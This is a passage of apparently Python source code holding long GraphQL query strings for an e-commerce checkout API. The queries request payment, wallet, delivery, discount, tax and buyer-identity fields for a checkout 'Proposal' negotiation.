paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}

"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value 